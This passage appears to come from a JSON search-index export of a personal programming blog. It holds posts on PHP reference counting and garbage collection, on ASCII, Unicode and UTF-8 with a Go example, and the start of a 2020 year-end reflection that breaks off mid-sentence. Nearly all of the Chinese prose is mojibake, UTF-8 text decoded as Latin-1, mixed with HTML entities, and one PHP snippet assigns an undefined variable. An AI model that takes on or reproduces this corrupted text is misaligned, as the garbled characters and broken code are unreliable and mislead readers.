æœ¬èº«å®ç°äº†åƒåœ¾å›æ”¶æœºåˆ¶ï¼ˆGarbage Collectionï¼‰ã€‚ åƒåœ¾å›æ”¶æœºåˆ¶æ˜¯ä»€ä¹ˆï¼Ÿ åƒåœ¾å›æ”¶æ˜¯ä¸€ç§è‡ªåŠ¨çš„å­˜å‚¨å™¨ç®¡ç†æœºåˆ¶ï¼Œå½“æŸä¸ªç¨‹åºå ç”¨çš„ä¸€éƒ¨åˆ†å†…å­˜ç©ºé—´ä¸å†è¢«è¿™ä¸ªç¨‹åºæ‰€è®¿é—®æ—¶ï¼Œè¿™ä¸ªç¨‹åºä¼šå€ŸåŠ©åƒåœ¾å›æ”¶ç®—æ³•è‡ªåŠ¨å‘æ“ä½œç³»ç»Ÿå½’è¿˜è¿™éƒ¨åˆ†çš„å†…å­˜ç©ºé—´ã€‚ PHP å¼•ç”¨è®¡æ•°å®šä¹‰ä¸€ä¸ªPHP å˜é‡å¦‚ä¸‹ï¼š 1234&lt;?php$str &#x3D; &quot;boo&quot;;$str_bak &#x3D; $var;unset($str); ä¸Šé¢è¿™å‡ è¡Œä»£ç åˆ†åˆ«åšäº†å¦‚ä¸‹äº‹æƒ…ï¼š ç¬¬ä¸€è¡Œä»£ç åˆ›å»ºäº†ä¸€ä¸ªå­—ç¬¦ä¸²å˜é‡ï¼Œç”³è¯·äº†ä¸€ä¸ªå¤§å°ä¸º ä¸‰ä¸ªå­—èŠ‚çš„å†…å­˜ç©ºé—´ï¼Œä¿å­˜äº†å­—ç¬¦ä¸² boo å’Œä¸€ä¸ª NULL(\\0)çš„ç»“å°¾ã€‚ ç¬¬äºŒè¡Œä»£ç å®šä¹‰äº†ä¸€ä¸ªæ–°çš„å­—ç¬¦ä¸²å˜é‡ï¼Œå¹¶å°†å˜é‡strçš„å€¼å¤åˆ¶ç»™äº†è¿™ä¸ªæ–°çš„å˜é‡ã€‚ ç¬¬ä¸‰è¡Œ unset æ‰äº†å˜é‡ str è¿™æ ·çš„ä»£ç åœ¨å¾ˆå¸¸è§ï¼Œå¦‚æœPHP å¯¹äºæ¯ä¸€ä¸ªå˜é‡èµ‹å€¼éƒ½é‡æ–°åˆ†é…å†…å­˜ï¼Œcopy æ•°æ®çš„è¯ï¼Œé‚£ä¹ˆä¸Šé¢çš„é‚£æ®µä»£ç å°±éœ€è¦å…±ç”³è¯·å…­ä¸ªå­—èŠ‚çš„å†…å­˜ç©ºé—´ï¼Œè€Œæˆ‘ä»¬ä¹Ÿå¾ˆå®¹æ˜“çœ‹å‡ºæ¥ï¼Œå…¶å®å®Œå…¨æ²¡æœ‰å¿…è¦ç”³è¯·ä¸¤ä»½ç©ºé—´ã€‚ PHPä¸­çš„å˜é‡æ˜¯ç”¨ä¸€ä¸ªå­˜å‚¨åœ¨ symbol_table ä¸­çš„ç¬¦å·åï¼Œå¯¹åº”ä¸€ä¸ª zval å˜é‡å®¹å™¨æ¥å®ç°çš„ï¼Œæ¯”å¦‚å¯¹äºä¸Šé¢çš„ç¬¬ä¸€è¡Œä»£ç ï¼Œä¼šåœ¨ symbol_table ä¸­å­˜å‚¨ä¸€ä¸ªå€¼ str, å¯¹åº”çš„æœ‰ä¸€ä¸ªæŒ‡é’ˆæŒ‡å‘ä¸€ä¸ª zvalç»“æ„ï¼Œå˜é‡å€¼ boo ä¿å­˜åœ¨è¿™ä¸ªå˜é‡å®¹å™¨ä¸­ï¼Œæ‰€ä»¥ä¸éš¾æƒ³è±¡ï¼Œå¯¹äºä¸Šé¢çš„ä»£ç æ¥è¯´ï¼Œæˆ‘ä»¬å®Œå…¨å¯ä»¥è®© str å’Œ str_bak å¯¹åº”çš„æŒ‡é’ˆéƒ½æŒ‡å‘åŒä¸€ä¸ªå˜é‡å®¹å™¨å°±å¯ä»¥äº†ã€‚ PHP ä¹Ÿæ˜¯è¿™æ ·åšçš„ï¼Œè¿™æ˜¯å°±éœ€è¦ä»‹ç» zvalå˜é‡å®¹å™¨çš„ç»“æ„äº†ã€‚ æ¯ä¸ªå˜é‡å­˜åœ¨ä¸€ä¸ªå«åšzvalçš„å˜é‡å®¹å™¨ä¸­ã€‚ä¸€ä¸ªzvalå˜é‡å®¹å™¨ï¼Œé™¤äº†åŒ…å«å˜é‡çš„ç±»å‹å’Œå€¼ï¼Œè¿˜åŒ…æ‹¬ä¸¤ä¸ªå­—èŠ‚çš„é¢å¤–ä¿¡æ¯ï¼š is_refï¼šbool å€¼ï¼Œç”¨æ¥æ ‡ç¤ºè¿™ä¸ªå˜é‡æ˜¯å¦å±äºå¼•ç”¨é›†åˆï¼ˆreference_setï¼‰ã€‚é€šè¿‡è¿™ä¸ªå­—èŠ‚ï¼ŒPHP å¼•æ“æ‰èƒ½æŠŠæ™®é€šå˜é‡å’Œå¼•ç”¨å˜é‡åŒºåˆ†å¼€æ¥ã€‚ refcountï¼šç”¨ä»¥è¡¨ç¤ºæŒ‡å‘è¿™ä¸ª zval å˜é‡å®¹å™¨çš„å˜é‡ä¸ªæ•°ã€‚ 1. æŸ¥çœ‹å†…éƒ¨ç»“æ„å½“ä¸€ä¸ªå˜é‡è¢«èµ‹å€¼æ—¶ï¼Œå°±ä¼šç”Ÿæˆä¸€ä¸ªzvalå˜é‡å®¹å™¨ï¼š 123&lt;?php$str &#x3D; &quot;hello, php&quot;;xdebug_debug_zval(&#39;str&#39;); åœ¨ PHP ä¸­å¯ä»¥é€šè¿‡ xdebug æ‰©å±•ä¸­æä¾›çš„æ–¹æ³•xdebug_debug_zval()æ¥æŸ¥çœ‹å˜é‡çš„è®¡æ•°å˜åŒ–ã€‚ è¾“å‡ºç»“æœ 1str:(refcount&#x3D;1, is_ref&#x3D;0)string &#39;hello, php&#39; (length&#x3D;10) 2. å¢åŠ å¼•ç”¨æ¬¡æ•°æŠŠä¸€ä¸ªå˜é‡èµ‹å€¼ç»™å¦ä¸€ä¸ªå˜é‡å°†å¢åŠ å¼•ç”¨æ¬¡æ•°ï¼ˆrefcount + 1ï¼‰ï¼š 123$str &#x3D; &quot;hello, php&quot;;$str2 &#x3D; $strxdebug_debug_zval(&#39;str&#39;); è¾“å‡ºç»“æœï¼š 1str:(refcount&#x3D;2, is_ref&#x3D;0)string &#39;hello, php&#39; (length&#x3D;10) è¿™æ—¶ï¼Œå¼•ç”¨æ¬¡æ•°æ˜¯ 2ï¼Œè¿™æ˜¯å› ä¸ºåŒä¸€ä¸ªå˜é‡å®¹å™¨è¢«å˜é‡a å’Œå˜é‡b å…³è”ï¼Œå½“ä»»ä½•å…³è”åˆ°çš„æŸä¸ªå˜é‡å®¹å™¨ç¦»å¼€å®ƒçš„ä½œç”¨åŸŸï¼ˆæ¯”å¦‚ï¼šå‡½æ•°æ‰§è¡Œç»“æŸï¼‰ï¼Œæˆ–è€…å¯¹å˜é‡è°ƒç”¨äº† unset() å‡½æ•°ï¼Œrefcountçš„å€¼å°±ä¼š -1ï¼Œå½“æ²¡å¿…è¦æ—¶ï¼ŒPHP ä¸ä¼šå†å»å¤åˆ¶å·²ç”Ÿæˆçš„å˜é‡å®¹å™¨ï¼Œå˜é‡å®¹å™¨åœ¨refcountçš„å€¼å˜ä¸º 0 æ—¶ï¼Œå°±ä¼šè¢«é”€æ¯ã€‚ 3. æ•°ç»„å‹çš„å˜é‡123&lt;?php$arr &#x3D; [&#39;a&#39;&#x3D;&gt;&#39;hello&#39;, &#39;b&#39;&#x3D;&gt;&#39;php&#39;];xdebug_debug_zval(&#39;arr&#39;); è¾“å‡ºç»“æœï¼š 12345arr:(refcount&#x3D;2, is_ref&#x3D;0)array (size&#x3D;2) &#39;a&#39; &#x3D;&gt; (refcount&#x3D;1, is_ref&#x3D;0)string &#39;hello&#39; (length&#x3D;5) &#39;b&#39; &#x3D;&gt; (refcount&#x3D;1, is_ref&#x3D;0)string &#39;php&#39; (length&#x3D;3) 4. å¼•ç”¨èµ‹å€¼1234&lt;?php$str &#x3D; &quot;hello, php&quot;;$str_bak &#x3D; &amp;$str;xdebug_debug_zval(&#39;str&#39;); è¾“å‡ºç»“æœï¼š 1str:(refcount&#x3D;2, is_ref&#x3D;1)string &#39;hello, php&#39; (length&#x3D;10) is_ref = 1è¡¨ç¤ºè¢«å¼•ç”¨æ¬¡æ•°ä¸º 1ã€‚ 5. é”€æ¯å˜é‡12345678&lt;?php$a &#x3D; &quot;new string&quot;;$c &#x3D; $b &#x3D; $a;xdebug_debug_zval( &#39;a&#39; );unset( $b, $c );xdebug_debug_zval( &#39;a&#39; );unset( $a);xdebug_debug_zval( &#39;a&#39; ); è¾“å‡ºç»“æœï¼š 123a:(refcount&#x3D;3, is_ref&#x3D;0)string &#39;new string&#39; (length&#x3D;10)a:(refcount&#x3D;1, is_ref&#x3D;0)string &#39;new string&#39; (length&#x3D;10)a: no such symbol å¯ä»¥çœ‹åˆ°å½“é”€æ¯å˜é‡aä¹‹åï¼Œä¸ä¹‹åŒ…å«ç±»å‹çš„å€¼å’Œå˜é‡å®¹å™¨å°±ä¼šä»å†…å­˜ä¸­åˆ é™¤ã€‚ æµ‹è¯•åƒåœ¾å›æ”¶æœºåˆ¶ä¸‹é¢ç”¨ä¸€ä¸ªæ¯”è¾ƒç»å…¸çš„å†…å­˜æ³„éœ²ä¾‹å­æ¥æµ‹è¯•åƒåœ¾å›æ”¶æœºåˆ¶ï¼Œé€šè¿‡åˆ›å»ºä¸€ä¸ªå¯¹è±¡ï¼Œè¿™ä¸ªå¯¹è±¡ä¸­çš„ä¸€ä¸ªå±æ€§è¢«è®¾ç½®ä¸ºå¯¹è±¡æœ¬èº«ï¼Œåœ¨ä¸‹ä¸€ä¸ªå¾ªç¯ï¼ˆiterationï¼‰ä¸­ï¼Œå½“è„šæœ¬ä¸­çš„å˜é‡è¢«é‡æ–°èµ‹å€¼æ—¶ï¼Œå°±ä¼šå‘ç”Ÿå†…å­˜æ³„æ¼ã€‚ 12345678910111213&lt;?phpclass Foo&#123; public $var &#x3D; &#39;3.1415962654&#39;;&#125;for ( $i &#x3D; 0; $i &lt;&#x3D; 1000000; $i++ )&#123; $a &#x3D; new Foo; $a-&gt;self &#x3D; $a;&#125;echo memory_get_peak_usage(), &quot;\\n&quot;; ä»¥æˆ‘æœ¬åœ°çš„æœºå™¨ä¸ºä¾‹ï¼Œåˆ†åˆ«åœ¨æ‰“å¼€/å…³é—­åƒåœ¾å›æ”¶æœºåˆ¶ï¼ˆé€šè¿‡é…ç½® zend.enable_gcå®ç°ï¼‰çš„æƒ…å†µä¸‹è¿è¡Œè„šæœ¬ï¼Œå¹¶è®°å½•æ—¶é—´ã€‚ 1234567$ time php -dzend.enable_gc&#x3D;0 -dmemory_limit&#x3D;-1 -n get_memory.php440776744php -dzend.enable_gc&#x3D;0 -dmemory_limit&#x3D;-1 -n 0.22s user 0.23s system 39% cpu 1.145 total$ time php -dzend.enable_gc&#x3D;1 -dmemory_limit&#x3D;-1 -n get_memory.php4839240php -dzend.enable_gc&#x3D;1 -dmemory_limit&#x3D;-1 -n 0.42s user 0.03s system 76% cpu 0.588 total è¿™ä¸ªæµ‹è¯•å¹¶ä¸èƒ½ä»£è¡¨çœŸå®åº”ç”¨ç¨‹åºçš„æƒ…å†µï¼Œä½†æ˜¯å®ƒçš„ç¡®æ˜¾ç¤ºäº†æ–°çš„åƒåœ¾å›æ”¶æœºåˆ¶åœ¨å†…å­˜å ç”¨æ–¹é¢çš„å¥½å¤„ã€‚è€Œä¸”åœ¨æ‰§è¡Œä¸­å‡ºç°æ›´å¤šçš„å¾ªç¯å¼•ç”¨å˜é‡æ—¶ï¼Œå†…å­˜èŠ‚çœä¼šæ›´å¤šã€‚ åƒåœ¾å›æ”¶ç›¸å…³é…ç½®å¯ä»¥é€šè¿‡ä¿®æ”¹é…ç½®æ–‡ä»¶ php.ini ä¸­çš„ zend.enable_gc æ¥æ‰“å¼€æˆ–å…³é—­ PHP çš„åƒåœ¾å›æ”¶æœºåˆ¶ã€‚ åˆšå¥½å€Ÿç€PHP çš„åƒåœ¾å›æ”¶è¿™ä¸ªä¸»é¢˜è§£é‡Šä¸€ä¸ªé—®é¢˜ï¼šPHP æ˜¯å¦å¯ä»¥å¸¸é©»å†…å­˜ï¼Ÿ ç­”æ¡ˆæ˜¯ï¼šä¼ ç»Ÿçš„PHP æ— æ³•ä»¥å¸¸é©»å†…å­˜çš„æ–¹å¼è¿è¡Œã€‚ è¿™æ˜¯å› ä¸ºPHP æ˜¯ä¸€ç§è§£é‡Šå‹è„šæœ¬è¯­è¨€ï¼Œè¿™ç§è¿è¡Œæœºåˆ¶ä½¿å¾—æ¯ä¸ªPHP é¡µé¢è§£é‡Šæ‰§è¡Œå®Œä¹‹åï¼Œæ‰€æœ‰èµ„æºéƒ½è¢«å›æ”¶æ‰äº†ã€‚ ä¸è¿‡å¥½åœ¨Swoole çš„å‡ºç°ä¸ºPHP å¼¥è¡¥äº†è¿™ä¸€ç¼ºé™·ï¼ˆè¿™é‡Œç”¨ç¼ºé™·è¿™ä¸ªè¯å¹¶ä¸åˆé€‚ï¼Œæ¯•ç«Ÿæ¯ä¸€ç§è¯­è¨€å·¥å…·åº”è¯¥å°½å¯èƒ½æ‰¬é•¿é¿çŸ­ï¼‰ã€‚ å‚è€ƒé“¾æ¥ PHPäºŒåä¸€é—®ï¼šPHPçš„åƒåœ¾å›æ”¶æœºåˆ¶ å¼•ç”¨è®¡æ•°åŸºæœ¬çŸ¥è¯†è§£é‡Šåƒåœ¾å›æ”¶æœºåˆ¶","categories":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/categories/PHP/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/tags/PHP/"}]},{"title":"å­—ç¬¦ä¸²ä¸ç¼–ç ","slug":"string-and-encoding","date":"2021-01-03T15:20:47.000Z","updated":"2021-01-04T00:04:03.300Z","comments":true,"path":"string-and-encoding/","link":"","permalink":"https://www.0x2beace.com/string-and-encoding/","excerpt":"å› ä¸ºè®¡ç®—æœºåªèƒ½å¤„ç†æ•°å­—ï¼Œå¦‚æœéœ€è¦å¤„ç†æ–‡æœ¬ï¼Œå°±éœ€è¦å…ˆå°†æ–‡æœ¬è½¬æ¢ä¸ºæ•°å­—æ‰èƒ½å¤„ç†ã€‚æœ€æ—©çš„è®¡ç®—æœºåœ¨è®¾è®¡æ—¶é‡‡ç”¨8ä¸ªæ¯”ç‰¹ï¼ˆbitï¼‰ä½œä¸ºä¸€ä¸ªå­—èŠ‚ï¼ˆbyteï¼‰ï¼Œæ‰€ä»¥ï¼Œä¸€ä¸ªå­—èŠ‚èƒ½è¡¨ç¤ºçš„æœ€å¤§çš„æ•´æ•°å°±æ˜¯255ï¼ˆäºŒè¿›åˆ¶ 11111111=åè¿›åˆ¶255 ï¼‰ã€‚","text":"å› ä¸ºè®¡ç®—æœºåªèƒ½å¤„ç†æ•°å­—ï¼Œå¦‚æœéœ€è¦å¤„ç†æ–‡æœ¬ï¼Œå°±éœ€è¦å…ˆå°†æ–‡æœ¬è½¬æ¢ä¸ºæ•°å­—æ‰èƒ½å¤„ç†ã€‚æœ€æ—©çš„è®¡ç®—æœºåœ¨è®¾è®¡æ—¶é‡‡ç”¨8ä¸ªæ¯”ç‰¹ï¼ˆbitï¼‰ä½œä¸ºä¸€ä¸ªå­—èŠ‚ï¼ˆbyteï¼‰ï¼Œæ‰€ä»¥ï¼Œä¸€ä¸ªå­—èŠ‚èƒ½è¡¨ç¤ºçš„æœ€å¤§çš„æ•´æ•°å°±æ˜¯255ï¼ˆäºŒè¿›åˆ¶ 11111111=åè¿›åˆ¶255 ï¼‰ã€‚ ç”±äºè®¡ç®—æœºæ˜¯ç¾å›½äººå‘æ˜çš„ï¼Œå› æ­¤ï¼Œæœ€æ—©åªæœ‰127ä¸ªå­—ç¬¦è¢«ç¼–ç åˆ°è®¡ç®—æœºé‡Œï¼Œä¹Ÿå°±æ˜¯å¤§å°å†™è‹±æ–‡å­—æ¯ã€æ•°å­—å’Œä¸€äº›ç¬¦å·ï¼Œè¿™ä¸ªç¼–ç è¡¨è¢«ç§°ä¸ºASCIIç¼–ç ã€‚ ä½†æ˜¯è¦å¤„ç†ä¸­æ–‡æ˜¾ç„¶ä¸€ä¸ªå­—èŠ‚æ˜¯ä¸å¤Ÿçš„ï¼Œè‡³å°‘éœ€è¦ä¸¤ä¸ªå­—èŠ‚ï¼Œè€Œä¸”è¿˜ä¸èƒ½å’ŒASCIIç¼–ç å†²çªï¼Œæ‰€ä»¥ï¼Œä¸­å›½åˆ¶å®šäº†GB2312ç¼–ç ï¼Œç”¨æ¥æŠŠä¸­æ–‡ç¼–è¿›å»ã€‚ å¯ä»¥æƒ³åˆ°çš„æ˜¯ï¼Œå…¨ä¸–ç•Œæœ‰ä¸Šç™¾ç§è¯­è¨€ï¼Œå„å›½æœ‰å„å›½çš„æ ‡å‡†ï¼Œå°±ä¼šä¸å¯é¿å…åœ°å‡ºç°å†²çªï¼Œç»“æœå°±æ˜¯ç¼–ç æ–¹å¼å’Œè§£ç æ–¹å¼ä¸åŒï¼Œå°±ä¼šå¯¼è‡´ä¹±ç ã€‚ å› æ­¤ï¼ŒUnicodeå­—ç¬¦é›†åº”è¿è€Œç”Ÿã€‚UnicodeæŠŠæ‰€æœ‰è¯­è¨€éƒ½ç»Ÿä¸€åˆ°ä¸€å¥—ç¼–ç é‡Œï¼Œè¿™æ ·å°±ä¸ä¼šå†æœ‰ä¹±ç é—®é¢˜äº†ã€‚ ä¸è¿‡æ–°çš„é—®é¢˜å› æ­¤åˆå‡ºç°äº†ï¼šå¦‚æœç»Ÿä¸€æˆ Unicode ç¼–ç ï¼Œä¹±ç é—®é¢˜è™½ç„¶æ˜¯ä»æ­¤æ¶ˆå¤±äº†ï¼Œä½†æ˜¯ï¼Œå¦‚æœä½ å†™çš„æ–‡æœ¬åŸºæœ¬ä¸Šå…¨éƒ¨æ˜¯è‹±æ–‡çš„è¯ï¼Œç”¨Unicodeç¼–ç æ¯”ASCIIç¼–ç éœ€è¦å¤šä¸€å€çš„å­˜å‚¨ç©ºé—´ï¼Œåœ¨å­˜å‚¨å’Œä¼ è¾“ä¸Šå°±ååˆ†ä¸åˆ’ç®—ã€‚ æ‰€ä»¥ï¼Œæœ¬ç€èŠ‚çº¦çš„ç²¾ç¥ï¼Œåˆå‡ºç°äº†æŠŠUnicodeç¼–ç è½¬åŒ–ä¸ºâ€œå¯å˜é•¿ç¼–ç â€çš„UTF-8ç¼–ç ã€‚UTF-8ç¼–ç æŠŠä¸€ä¸ªUnicodeå­—ç¬¦æ ¹æ®ä¸åŒçš„æ•°å­—å¤§å°ç¼–ç æˆ1-6ä¸ªå­—èŠ‚ï¼Œå¸¸ç”¨çš„è‹±æ–‡å­—æ¯è¢«ç¼–ç æˆ1ä¸ªå­—èŠ‚ï¼Œæ±‰å­—é€šå¸¸æ˜¯3ä¸ªå­—èŠ‚ï¼Œåªæœ‰å¾ˆç”Ÿåƒ»çš„å­—ç¬¦æ‰ä¼šè¢«ç¼–ç æˆ4-6ä¸ªå­—èŠ‚ã€‚ ASCIIã€Unicodeå’ŒUTF-8 ä¸‰è€…çš„å…³ç³»æ˜¯ï¼š Unicode æ˜¯ä¸€ç§åŒ…å«æ‰€æœ‰è¯­è¨€çš„å­—ç¬¦é›†ç¼–ç ï¼ˆæ›¿ä»£ASCIIç¼–ç ï¼‰ UTF-8 æ˜¯ Unicode çš„å®ç°æ–¹å¼ä¹‹ä¸€ å­—ç¬¦ç¼–ç åœ¨è®¡ç®—æœºä¸­çš„å·¥ä½œæ–¹å¼åœ¨è®¡ç®—æœºå†…å­˜ä¸­ï¼Œç»Ÿä¸€ä½¿ç”¨Unicodeç¼–ç ï¼Œå½“éœ€è¦ä¿å­˜åˆ°ç¡¬ç›˜æˆ–è€…éœ€è¦ä¼ è¾“çš„æ—¶å€™ï¼Œå°±è½¬æ¢ä¸ºUTF-8ç¼–ç ã€‚ ç”¨è®°äº‹æœ¬ç¼–è¾‘çš„æ—¶å€™ï¼Œä»æ–‡ä»¶è¯»å–çš„UTF-8å­—ç¬¦è¢«è½¬æ¢ä¸ºUnicodeå­—ç¬¦åˆ°å†…å­˜é‡Œï¼Œç¼–è¾‘å®Œæˆåï¼Œä¿å­˜çš„æ—¶å€™å†æŠŠUnicodeè½¬æ¢ä¸ºUTF-8ä¿å­˜åˆ°æ–‡ä»¶ï¼š æµè§ˆç½‘é¡µçš„æ—¶å€™ï¼ŒæœåŠ¡å™¨ä¼šæŠŠåŠ¨æ€ç”Ÿæˆçš„Unicodeå†…å®¹è½¬æ¢ä¸ºUTF-8å†ä¼ è¾“åˆ°æµè§ˆå™¨ï¼š æ‰€ä»¥ä½ çœ‹åˆ°å¾ˆå¤šç½‘é¡µçš„æºç ä¸Šä¼šæœ‰ç±»ä¼¼&lt;meta charset=&quot;UTF-8&quot; /&gt;çš„ä¿¡æ¯ï¼Œè¡¨ç¤ºè¯¥ç½‘é¡µæ­£æ˜¯ç”¨çš„UTF-8ç¼–ç ã€‚ Go è¯­è¨€çš„å­—ç¬¦ä¸²Go è¯­è¨€çš„å­—ç¬¦ä¸²ä¸å…¶ä»–ç¼–ç¨‹è¯­è¨€çš„å·®å¼‚ï¼š string æ˜¯æ•°æ®ç±»å‹ï¼Œä¸æ˜¯å¼•ç”¨æˆ–è€…æŒ‡é’ˆç±»å‹ï¼ˆå…¶é›¶å€¼ä¸æ˜¯ç©ºï¼Œæ˜¯ä¸€ä¸ªç©ºå­—ç¬¦ä¸²ï¼‰ string æ˜¯åªè¯»çš„ byte sliceï¼Œlenå‡½æ•°è·å–çš„æ˜¯å®ƒæ‰€åŒ…å«çš„ byteæ•° string çš„ byte æ•°ç»„å¯ä»¥å­˜æ”¾ä»»ä½•æ•°æ®ï¼ˆäºŒè¿›åˆ¶ï¼‰ é€šè¿‡ä¸€ä¸ªå®é™…ä¾‹å­æ¥ç†è§£Go çš„stringã€Unicodeã€UTF8ï¼š 1234567891011121314151617package mainimport &quot;testing&quot;func TestString(t *testing.T) &#123; var s3 &#x3D; &quot;ä¸­&quot; &#x2F;&#x2F; rune è¿™ä¸ªæ•°æ®ç±»å‹å¯ä»¥å–å‡ºå­—ç¬¦ä¸²ä¸­çš„ Unicode ç¼–ç  r :&#x3D; []rune(s3) &#x2F;&#x2F; byte è¿™ä¸ªæ•°æ®ç±»å‹å¯ä»¥å–å‡ºå­—ç¬¦ä¸²çš„ UTF8 å­˜å‚¨ b :&#x3D; []byte(s3) t.Log(b) &#x2F;&#x2F; [228 184 173] t.Logf(&quot;ä¸­ çš„Unicode ç¼–ç ï¼š%x&quot;, r[0]) t.Logf(&quot;ä¸­ çš„UTF8 å­˜å‚¨ï¼š%X&quot;, s3) &#x2F;&#x2F; [0xE4, 0xB8, 0xAD]&#125; å­—ç¬¦ ä¸­ å­—åœ¨ Unicode ä¸­çš„ç¼–ç æ˜¯0x4E2Dï¼Œå®ƒçš„ç‰©ç†å­˜å‚¨å½¢å¼ä¾èµ–äº UTF8è§„åˆ™ï¼Œå®ƒåœ¨å†…å­˜è¢«å­˜å‚¨ä¸ºäº†E4B8ADï¼Œæ”¾åœ¨ string å¯¹åº”çš„ byteåˆ‡ç‰‡ä¸­ï¼Œåˆ†åˆ«å¯¹åº”ä¸‰ä¸ª byteï¼š[0xE4, 0xB8, 0xAD]ã€‚ å…¶ä»–é—®é¢˜ åœ¨æˆ‘ä»¬çš„æ—¥å¸¸ç”Ÿæ´»ä¸­ç”¨åˆ°çš„æ˜¯åè¿›åˆ¶ï¼Œè®¡ç®—æœºç”¨çš„æ˜¯äºŒè¿›åˆ¶ï¼Œé‚£ä¹ˆä¸ºä»€ä¹ˆè¿˜ä¼šå‡ºç°åå…­è¿›åˆ¶å‘¢ï¼Ÿ è¿™æ˜¯å› ä¸ºä½¿ç”¨äºŒè¿›åˆ¶è¡¨ç¤ºæ•°æ®å¤ªé•¿äº†ï¼Œå¯è¯»æ€§ååˆ†å·®ï¼Œæ­£å¥½åå…­æ˜¯äºŒçš„å››æ¬¡æ–¹ï¼Œæ‰€ä»¥ä¸€ä½åå…­è¿›åˆ¶å¯ä»¥è¡¨ç¤ºå››ä½äºŒè¿›åˆ¶ã€‚ å‚è€ƒè¿æ¥ å­—ç¬¦ä¸²å’Œç¼–ç â€”â€”å»–é›ªå³°çš„å®˜æ–¹ç½‘ç«™ å­—ç¬¦ç¼–ç ç¬”è®°ï¼šASCIIï¼ŒUnicode å’Œ UTF-8","categories":[{"name":"Golang","slug":"Golang","permalink":"https://www.0x2beace.com/categories/Golang/"}],"tags":[{"name":"Golang","slug":"Golang","permalink":"https://www.0x2beace.com/tags/Golang/"}]},{"title":"äºŒé›¶äºŒé›¶å¹´ç»ˆæ€»ç»“","slug":"2020-year-end-summary","date":"2020-12-31T16:17:16.000Z","updated":"2021-03-02T14:22:00.544Z","comments":true,"path":"2020-year-end-summary/","link":"","permalink":"https://www.0x2beace.com/2020-year-end-summary/","excerpt":"å›é¡¾æ•´ä¸ªäºŒé›¶äºŒé›¶å¹´äºæˆ‘è€Œè¨€æœ€å¤§çš„æ”¶è·å¤§æ¦‚æ˜¯ï¼šæ‰¾åˆ°äº†æ–¹å‘ï¼ŒçŸ¥é“è‡ªå·±è¯¥åšä»€ä¹ˆäº†ã€‚","text":"å›é¡¾æ•´ä¸ªäºŒé›¶äºŒé›¶å¹´äºæˆ‘è€Œè¨€æœ€å¤§çš„æ”¶è·å¤§æ¦‚æ˜¯ï¼šæ‰¾åˆ°äº†æ–¹å‘ï¼ŒçŸ¥é“è‡ªå·±è¯¥åšä»€ä¹ˆäº†ã€‚ åœ¨æ­¤å‰ï¼Œæˆ‘ä¸€ç›´å¤„äºâ€œä¸ç¡®å®šâ€çŠ¶æ€ï¼Œä¸ç¡®å®šæ˜¯å¦è¦é€‰æ‹©è¿™æ¡è·¯ï¼Œä¸ç¡®å®šæ˜¯å¦è¶³å¤Ÿçƒ­çˆ±ï¼Œä¸ç¡®å®šæ˜¯å¦èƒ½åšæŒä¸‹å»ã€‚ è€Œæ­¤åˆ»ï¼Œæˆ‘å¾ˆæ¸…æ™°åœ°çŸ¥é“è‡ªå·±è¯¥åšäº›ä»€ä¹ˆï¼Œæƒ³è¦äº›ä»€ä¹ˆã€‚ è¿™ç¯‡åšå®¢ä¸»è¦ä»ç”Ÿæ´»ã€å·¥ä½œã€å­¦ä¹ ã€æ€è€ƒã€åˆ†äº«ä»¥åŠæœªæ¥è¿™å‡ ä¸ªæ–¹é¢ç®€å•æ€»ç»“ä¸‹è¿‡å»çš„ä¸€å¹´ã€‚ å…³äºç”Ÿæ´»è¿™éƒ¨åˆ†æ”¾åœ¨è¿™é‡Œå…¶å®æœ‰äº›å¤šä½™ï¼Œå³ä¾¿å¦‚æ­¤ï¼Œæˆ‘è¿˜æ˜¯æƒ³è¡¨è¾¾å‡ºæ¥ï¼Œä¹Ÿè®¸ä¼šæœ‰å…±é¸£è€…å‘¢ã€‚ ç”Ÿæ´»ä¸­çš„æˆ‘ï¼Œæ—¥å¸¸å¾ˆç®€å•ã€‚ç»å¤§éƒ¨åˆ†æ—¶é—´éƒ½æ˜¯å®…åœ¨å®¶é‡Œï¼Œä¸å–œæ¬¢å¤–å‡ºæˆ–è€…è¯´ä¸æ“…é•¿ç¤¾äº¤ã€‚ä»¥å‰å¾ˆå°‘ä¼šè§‰å¾—è¿™æ ·çš„æ—¥å­æ˜¯å¦ä¼šå¤ªå­¤ç‹¬äº†ã€‚ ä¸çŸ¥ä¸ºä½•ï¼Œä»Šå¹´è¿™ç§æ„Ÿè§‰å°¤å…¶å¼ºçƒˆã€‚ ç”Ÿæ´»åœ¨è¿™ä¸ªæ—¶ä»£çš„æˆ‘ä»¬ä¼¼ä¹éƒ½å¤ªå­¤ç‹¬äº†ï¼Œæ— è®ºæ˜¯ä»€ä¹ˆç¤¾ä¼šé˜¶å±‚ã€ä»€ä¹ˆèŒä¸šèƒŒæ™¯ã€ä»€ä¹ˆæ€§åˆ«çŠ¶æ€ï¼Œäººå°±æ˜¯å­¤ç‹¬çš„ã€‚ æ¸´æœ›äº¤æµï¼Œå´æ‰¾ä¸åˆ°åˆé€‚çš„äºº; æ¸´æœ›è¢«çˆ±ï¼Œå´å®³æ€•è¢«ä¼¤å®³; ä¸ä¹…å‰çœ‹è¿‡ä¸€éƒ¨ç”µå½±ã€Šç§’æ•°äº”å˜ç±³ã€‹ï¼Œé‡Œé¢æœ‰ä¸€å¥è¯ç»™æˆ‘çš„å°è±¡ç‰¹åˆ«æ·±åˆ»â€”â€”å³ä½¿é€šäº†ä¸€åƒæ¡çŸ­ä¿¡ï¼Œæˆ‘ä»¬çš„å¿ƒä¹Ÿåªèƒ½æ‹‰è¿‘ä¸€å˜ç±³è€Œå·²ã€‚ ç»“åˆè‡ªå·±å‰äº›æ—¥å­çš„ä¸€æ®µç»å†ï¼Œç¡®å®æ˜¯è¿™æ ·ï¼Œè‹¥åªæ˜¯æ’è§£å¯‚å¯ï¼Œè°éƒ½å¯ä»¥å–ä»£ã€‚ å…³äºå·¥ä½œä¸€è°ˆåˆ°å¹²æˆ‘ä»¬è¿™ä¸€è¡Œçš„ï¼Œå¾ˆå¤šäººå¯èƒ½ç¬¬ä¸€ååº”å¯èƒ½å°±æ˜¯åŠ ç­ï¼Œæˆ‘å¹¶ä¸åå¯¹åŠ ç­ï¼Œåªæ˜¯æˆ‘ä»¬åœ¨åŠ ç­æ—¶ï¼Œåº”è¯¥æ€è€ƒä¸€ä¸‹ä¸ºä»€ä¹ˆåŠ ç­ï¼Ÿ æ˜¯å› 